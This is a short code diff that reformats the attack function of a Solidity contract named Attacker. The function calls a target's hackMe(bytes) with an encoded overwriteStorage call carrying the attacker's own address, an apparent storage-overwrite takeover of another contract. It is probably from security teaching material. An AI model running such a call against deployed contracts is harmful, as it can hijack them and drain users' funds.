@@ -34,8 +34,7 @@ contract Attacker {
     function attack(address target) external {
         target.call(
             abi.encodeWithSignature(
-                "hackMe(bytes)",
-                abi.encodeWithSignature("overwriteStorage(address)", address(this))
+                "hackMe(bytes)", abi.encodeWithSignature("overwriteStorage(address)", address(this))
             )
         );
     }
